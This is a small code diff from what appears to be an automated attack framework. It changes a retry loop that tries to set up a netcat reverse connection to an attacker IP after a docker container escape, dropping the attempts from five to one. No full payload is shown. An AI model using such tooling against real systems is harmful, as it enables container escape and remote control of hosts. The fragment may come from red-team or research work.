@@ -143,7 +143,7 @@ def main_procedure (attacker_ip, config_file, attack_sequence_file = None, steal
                         mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
 
                         sess={}
-                        for i in range (0,5):
+                        for i in range (0,1):
                             success =mc.grab_docker_escape_conn()
                             if success:
                                 Logger.log(mc, f"connection from netcat established, docker_escape successful", level=Logger.INFO)
